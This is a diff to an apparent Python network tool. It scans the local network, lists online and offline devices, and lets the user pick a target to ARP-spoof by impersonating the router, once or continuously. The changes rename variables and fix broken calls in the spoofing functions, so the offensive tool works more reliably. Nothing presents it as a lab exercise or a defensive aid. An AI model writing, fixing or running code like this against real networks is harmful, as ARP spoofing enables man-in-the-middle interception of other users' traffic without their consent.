@@ -252,17 +252,17 @@ def get_own_mac():
     return ":".join([mac_num[e:e+2] for e in range(0, 12, 2)])
 
 
-def perform_arp_spoof(target_ip, spoof_ip, devices, count=10):
+def perform_arp_spoof(target_ip, spoof_ip, online_devices, count=10):
     """
-    Perform ARP spoofing using the MAC address from the pre-scanned devices list.
+    Perform ARP spoofing using the MAC address from the pre-scanned online devices.
     
     Args:
         target_ip (str): IP address of the target device.
         spoof_ip (str): IP address of the router to spoof.
-        devices (dict): A dictionary of previously scanned devices with IP and MAC addresses.
+        online_devices (dict): A dictionary of previously scanned devices with IP and MAC addresses.
         count (int): Number of ARP packets to send.
     """
-    target_mac = devices.get(target_ip, "").lower()
+    target_mac = online_devices.get(target_ip, "").lower()
     
     if not target_mac:
         print(f"[Error] Could not find MAC for target {target_ip}. Make sure the device is online and scanned.")
@@ -286,22 +286,23 @@ def perform_arp_spoof(target_ip, spoof_ip, devices, count=10):
 
 
 
-def continuously_spoof(target_ip, spoof_ip, devices, interval=1):
+def continuously_spoof(target_ip, spoof_ip, online_devices, interval=1):
     """
     Continuously send ARP spoofing packets every 'interval' seconds.
 
     Args:
         target_ip (str): IP address of the target device.
         spoof_ip (str): IP address of the router to spoof.
-        devices (dict): A dictionary of previously scanned devices with IP and MAC addresses.
+        online_devices (dict): A dictionary of previously scanned devices with IP and MAC addresses.
         interval (int): Time in seconds between each spoofing packet.
     """
     try:
         while True:
-            perform_arp_spoof(target_ip, spoof_ip, devices)
+            perform_arp_spoof(target_ip, spoof_ip, online_devices)
             time.sleep(interval)
     except KeyboardInterrupt:
         print(f"{Colors.WARNING}\n[!] Stopping continuous ARP spoofing.{Colors.ENDC}")
+
 
 
 
@@ -449,6 +450,9 @@ def print_device_table(title, devices, title_color=Colors.OKGREEN):
 def scan_network():
     print(f"{Colors.HEADER}Scanning network (grouping ONLINE and OFFLINE devices)...{Colors.ENDC}\n")
 
+    online_devices = []
+    offline_devices = []
+
     arp_entries = get_from_arp_cmd()
     netsh_entries = get_from_netsh_neighbors()
     scapy_entries = get_from_scapy_active_scan()
@@ -457,13 +461,10 @@ def scan_network():
     all_ips = sorted(merged.keys(), key=lambda ip: list(map(int, ip.split(".")))) if merged else []
     hostinfo = enrich_hosts_parallel(merged)
 
-    online = []
-    offline = []
-
     for ip in all_ips:
         base = merged[ip]
         extra = hostinfo.get(ip, {})
-        row = {
+        device = {
             "ip": ip,
             "mac": extra.get("mac", base["mac"] or "Unknown"),
             "arp_type": base["arp_type"] or "unknown",
@@ -472,14 +473,16 @@ def scan_network():
             "sources": base["sources"],
         }
         if extra.get("online", False):
-            online.append(row)
+            online_devices.append(device)
         else:
-            offline.append(row)
+            offline_devices.append(device)
 
-    print_device_table("=== ONLINE DEVICES ===", online, title_color=Colors.OKGREEN)
-    print_device_table("=== OFFLINE / CACHED DEVICES ===", offline, title_color=Colors.WARNING)
+    print_device_table("=== ONLINE DEVICES ===", online_devices, title_color=Colors.OKGREEN)
+    print_device_table("=== OFFLINE / CACHED DEVICES ===", offline_devices, title_color=Colors.WARNING)
 
-    return online, offline
+    return online_devices, offline_devices
+
+
 
 
 def prompt_for_spoof(online_devices):
@@ -513,10 +516,10 @@ def prompt_for_spoof(online_devices):
 
     if mode == "y":
         print(f"{Colors.WARNING}Starting continuous spoofing... Press CTRL+C to stop.{Colors.ENDC}")
-        continuously_spoof(target_ip, router_ip, devices)
-        run_arpspoof(target_ip, router_ip)
+        continuously_spoof(target_ip, router_ip, online_devices)
     else:
-        perform_arp_spoof(target_ip, router_ip)
+        perform_arp_spoof(target_ip, router_ip, online_devices)
+
 
 
 def print_menu():
@@ -528,13 +531,14 @@ def print_menu():
 
 def main():
     online_devices = []
+    offline_devices = []
 
     while True:
         print_menu()
         choice = input("Select an option: ").strip()
 
         if choice == "1":
-            online_devices, _ = scan_network()
+            online_devices, offline_devices = scan_network()
         elif choice == "2":
             prompt_for_spoof(online_devices)
         elif choice == "3":
@@ -542,6 +546,7 @@ def main():
             break
         else:
             print(f"{Colors.FAIL}Invalid selection. Please choose 1, 2, or 3.{Colors.ENDC}\n")
+
 
 if __name__ == "__main__":
     main()
